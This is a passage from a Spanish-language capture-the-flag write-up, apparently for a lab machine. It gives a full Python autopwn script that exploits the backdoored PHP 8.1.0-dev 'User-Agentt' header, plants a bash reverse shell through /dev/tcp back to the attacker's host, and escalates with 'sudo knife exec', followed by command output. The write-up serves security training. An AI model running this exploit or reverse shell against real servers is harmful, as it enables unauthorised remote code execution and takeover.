## Vuln exploit & Gaining Access {-}

### Ganando accesso con un Autopwn en Pyton {-}

```python
#!/usr/bin/python3

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.242/"
lport = 443

def makeRequest():

    headers = {
        'User-Agentt': 'zerodiumsystem("bash -c \'bash -i >& /dev/tcp/10.10.14.15/443 0>&1\'");'
    }

    r = requests.get(main_url, headers=headers)

if __name__ == '__main__':

    p1 = log.progress("Pwn Web")
    p1.status("Explotando vulnerabilidad PHP 8.1.0-dev - User Agentt Remote Code Execution")

    time.sleep(2)

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible comprometer el sistema")
        sys.exit(1)
    else:
        p1.success("Comando inyectado exitosamente")
        shell.sendline("sudo knife exec -E 'exec \"/bin/sh\"'")
        shell.interactive()
```

Lo lanzamos con el commando `python3 autopwn.py`

```bash
whoami
#Output
james

hostname -I
#Output
10.10.10.242
```

